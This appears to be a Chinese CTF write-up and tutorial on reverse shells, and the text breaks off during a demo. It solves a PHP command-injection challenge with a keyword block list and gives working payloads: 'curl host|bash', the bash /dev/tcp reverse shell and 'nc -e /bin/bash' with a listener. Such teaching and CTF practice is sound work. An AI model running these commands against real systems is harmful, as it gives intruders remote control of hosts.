{"title":"从一道题目中学习反弹shell","uid":"3f5a0e228fd5b85476b92a268c8b102a","slug":"从一道题目中学习反弹shell","date":"2022-10-17T17:16:30.000Z","updated":"2023-03-14T07:12:28.000Z","comments":true,"path":"api/articles/从一道题目中学习反弹shell.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141511993.png","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>最近在帮一位大师傅测试招新赛的时候，发现自己对反弹shell是不太了解的，因此在用反弹shell解题过后，来对反弹shell进行相关学习，希望对各位师傅有所帮助。</p>\n<h1 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h1><p>首先这里给出题目代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|\\&amp;|\\\\$|\\x09|\\x26|\\`|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"NoNoNo\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里可以看出是命令执行类的题目，但是一些关键词被ban了，例如<code>php</code>被ban，因此这里的话想用<code>PHP://</code>伪协议读取flag就不行了，想写一句话木马的话虽然可以用<code>=</code>代替php，但因为这里<code>$</code>了，所以也不行，那么这里的思路我的话感觉是还有两种，一种是利用重定向符，他这里输出是无回显的，我们可以把他写到一个文件中，然后访问这个文件来查看回显，因此payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">cmd<span class=\"token operator\">=</span>ls <span class=\"token operator\">/</span><span class=\"token operator\">></span>a<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>接下来访问<code>xxx/a</code>(flag在这里，截图的时候没注意，导致没把flag截出来)<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150860.png\" alt=\"在这里插入图片描述\"><br>此时发现flag在根目录下，再用一下查看文件的命令重定向到a，本来是这样就可以了，但是这里我们发现ban了<code>flag</code>关键字，所以没办法直接<code>cat flag &gt;a</code>,但是我们知道还有通配符，<code>f*</code>可以表示<code>flag</code>，因此payload如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">cmd<span class=\"token operator\">=</span>cat <span class=\"token operator\">/</span>f<span class=\"token operator\">*</span><span class=\"token operator\">></span>a<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150856.png\" alt=\"在这里插入图片描述\"><br>还有一种方法，就是我想说的方法了，即反弹Shell，反弹Shell这个我之前用的都是nc命令，这里我构造payload如下来尝试反弹Shell</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">cmd<span class=\"token operator\">=</span>nc <span class=\"token operator\">-</span>e ip<span class=\"token operator\">/</span>port <span class=\"token number\">7777</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>但是没有反弹上来，可能是缺少了nc环境<br>因此这里的话只好再找另一个语句，后来想到用这个语句<code>bash -i&gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/7777 0&gt;&amp;1</code>,但是这里ban了<code>&amp;</code>,导致我们不能够直接进行反弹shell，这个时候看到<code>curl</code>没有被ban,我们可以利用curl来实现(原理后面讲，这里先说一下利用方式)，具体如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">curl xxx<span class=\"token punctuation\">:</span>xxx<span class=\"token punctuation\">:</span>xxx<span class=\"token punctuation\">:</span>xxx<span class=\"token punctuation\">:</span><span class=\"token class-name\">port</span><span class=\"token operator\">|</span><span class=\"token class-name\">bash</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>而我们的服务器下的内容为</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">bash <span class=\"token operator\">-</span>i<span class=\"token operator\">></span><span class=\"token operator\">&amp;</span> <span class=\"token operator\">/</span>dev<span class=\"token operator\">/</span>tcp<span class=\"token operator\">/</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">/</span><span class=\"token number\">7777</span> <span class=\"token number\">0</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150872.png\" alt=\"在这里插入图片描述\"></p>\n<p>这样就成功绕过了<code>&amp;</code>同时实现反弹shell。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>这里在做的时候需要服务器先监听7777端口，再执行语句</p></blockquote>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150022.png\" alt=\"在这里插入图片描述\"><br>发现flag<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150889.png\" alt=\"在这里插入图片描述\"><br>成功读取flag</p>\n<h1 id=\"反弹shell\"><a href=\"#反弹shell\" class=\"headerlink\" title=\"反弹shell\"></a>反弹shell</h1><h2 id=\"定义\"><a href=\"#定义\" class=\"headerlink\" title=\"定义\"></a>定义</h2><p>什么是反弹shell？<br>原词为<code>reverse shell</code>，含义如下</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。</p></blockquote>\n<p>其本质就是实现客户端与服务端的互换</p>\n<h2 id=\"利用原因\"><a href=\"#利用原因\" class=\"headerlink\" title=\"利用原因\"></a>利用原因</h2><p>初学时我们不禁有这样的疑问，为什么我们要用反弹shell呢？我们时候利用反弹shell呢？<br>解释如下</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>为什么要用反弹shell</p></blockquote>\n<p>这里不以CTF举例，以相对更真实一点的渗透过程来举例，比如你作为攻击方，成功向目标处上传了木马文件，可以执行一些语句，我们想获取一个可以直接操作主机的虚拟终端，这个时候就需要利用反弹shell了，因为反弹shell后才可以操作主机。这里借用安全客<code>myles007</code>大师傅的图来展示一下，这样可能会更生动易懂一些<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150877.png\" alt=\"在这里插入图片描述\"><br>那么这个问题解决了，接下来我们看下一个问题</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>什么时候用反弹shell</p></blockquote>\n<p>我认为的话就是以下两种情况</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、其环境是不稳定的，可能过段时间环境会变好<span class=\"token punctuation\">(</span>动态环境<span class=\"token punctuation\">)</span>\n<span class=\"token number\">2</span>、目标机无法接受请求，但是可以发送请求<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>在一位大师傅的文章中，我学习到了其他利用反弹shell的场景<br>(引用于<a href=\"https://xz.aliyun.com/t/2549#toc-1\">https://xz.aliyun.com/t/2549</a>)</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>1、由于防火墙等限制，对方机器只能发送请求，不能接收请求。<br>2、它的ip会动态改变，你不能持续控制。<br>3、某客户机中了你的网马，但是它在局域网内，你直接连接不了。<br>4、对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p></blockquote>\n<p>对于场景1来解释一下，就是这个时候，攻击机监听一个端口，目标机主动发送请求给攻击机的这个监听端口，这时候就实现了反弹连接</p>\n<h2 id=\"常见的反弹Shell语句原理\"><a href=\"#常见的反弹Shell语句原理\" class=\"headerlink\" title=\"常见的反弹Shell语句原理\"></a>常见的反弹Shell语句原理</h2><h3 id=\"Nc\"><a href=\"#Nc\" class=\"headerlink\" title=\"Nc\"></a>Nc</h3><p>nc，全称是<code>Netcat</code>,使用的是UDP和TCP协议，它可以相对较简单的建立一些连接，接下来了解一下要用到的参数</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">-</span>l 使用监听模式，管控传入的资料。\n<span class=\"token operator\">-</span>v 显示指令执行过程。\n<span class=\"token operator\">-</span>n 直接使用<span class=\"token constant\">IP</span>地址，而不通过域名服务器。\n<span class=\"token operator\">-</span>p<span class=\"token operator\">&lt;</span>通信端口<span class=\"token operator\">></span> 设置本地主机使用的通信端口。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这几个参数常用于监听，也就是攻击机使用的，当目标机主动连接我们的攻击机时，我们需要监听这个端口来实现获取shell，具体指令的话就是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">nc <span class=\"token operator\">-</span>lvnp <span class=\"token number\">7777</span> <span class=\"token comment\">//任意端口，没被占用即可(如果不行记得看看防火墙是否开启了对应端口)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>接下来还有一个参数，很重要的一个参数，也就是<code>-e</code>，其解释如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">-</span>e<span class=\"token punctuation\">,</span> <span class=\"token operator\">--</span>exec<span class=\"token operator\">=</span><span class=\"token constant\">PROGRAM</span>         program to exec after connect<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这个是啥意思呢，其实就是说在连接过后会执行程序，这个是为了我们连接后能够输入指令做准备，它是用于目标机的，由于目标机能够发送请求，所以我们让他通过<code>nc</code>指令和<code>e</code>参数，来向攻击机发送请求，把bash(一种shell)给发送出去，这样就实现了反弹shell</p>\n<h4 id=\"demo\"><a href=\"#demo\" class=\"headerlink\" title=\"demo\"></a>demo</h4><p>攻击机：监听端口7777，指令如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">nc<span class=\"token operator\">-</span>lvnp <span class=\"token number\">7777</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150247.png\" alt=\"在这里插入图片描述\"></p>\n<p>目标机:发送请求，将bash弹给攻击机</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">nc xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx <span class=\"token number\">7777</span> <span class=\"token operator\">-</span>e <span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>bash<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150407.png\" alt=\"在这里插入图片描述\"></p>\n<p>可以发现成功连接，可以执行指令。</p>\n<h3 id=\"Bash\"><a href=\"#Bash\" class=\"headerlink\" title=\"Bash\"></a>Bash</h3><p>Bash，全称<code>Bourne Again shell</code>,是一种shell，我们利用它来进行反弹shell的时候，常见的是将它与重定向符结合，指令如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">bash <span class=\"token operator\">-</span>i<span class=\"token operator\">></span><span class=\"token operator\">&amp;</span> <span class=\"token operator\">/</span>dev<span class=\"token operator\">/</span>tcp<span class=\"token operator\">/</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">/</span><span class=\"token number\">7777</span> <span class=\"token number\">0</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>对于这个该怎么去理解呢<br>首先我们了解一下<code>-i</code>参数，<code>-i</code>的话是指交互模式，那<code>bash -i</code>的话就是打开一个交互环境<br>接下来看<code>&gt;&amp;</code>，拆分来看，先看<code>&gt;</code><br>对于linux简单了解一下，可以知道这里的<code>&gt;</code>是重定向符，前面的语句会被写入到后面，比如<code>echo 2&gt;1.txt</code>，这个时候就会将2输出到<code>1.txt</code>文件中<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150281.png\" alt=\"在这里插入图片描述\"><br>这个时候就知道<code>&gt;</code>的作用了，接下来看一下<code>&amp;</code><br>我们知道<code>&amp;</code>是联合字符，相当于<code>and</code>，作用是连接前后，那么这里的话其实就是将前面和后面一起重定向给后面<br>接下来看这个<code>/dev/tcp/xxx.xxx.xxx.xxx/7777</code><br>在linux中，一切都是以文件形式存在的，这里的话就是和xxx这个ip地址的7777端口建立一个tcp连接<br>接下来看一下<code>0&gt;&amp;1</code>,这里的<code>&amp;</code>有特殊含义,具体如下</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>这里的&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp;，<br>系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述</p></blockquote>\n<p>这个0是与前面的攻击机结合的，输入0是由/dev/tcp/xxx.xxx.xxx.xxx/7777输入的，命令执行结果是1，当我们用重定向符<code>&gt;</code>，写出<code>0&gt;&amp;1</code>，这就实现了输入输出都在攻击机上。<br>这个时候的话再来看这个完整语句就比较好理解了</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">bash <span class=\"token operator\">-</span>i<span class=\"token operator\">></span><span class=\"token operator\">&amp;</span> <span class=\"token operator\">/</span>dev<span class=\"token operator\">/</span>tcp<span class=\"token operator\">/</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">/</span><span class=\"token number\">7777</span> <span class=\"token number\">0</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>先是bash生成交互环境，然后用发起与攻击机7777端口的连接（tcp连接），然后重定向给攻击机端口，而后将标准输出重定向到标准输入中，这就是整个语句的过程。</p>\n<h4 id=\"demo-1\"><a href=\"#demo-1\" class=\"headerlink\" title=\"demo\"></a>demo</h4><p>攻击机，开启监听</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">nc <span class=\"token operator\">-</span>lvnp <span class=\"token number\">7777</span><span 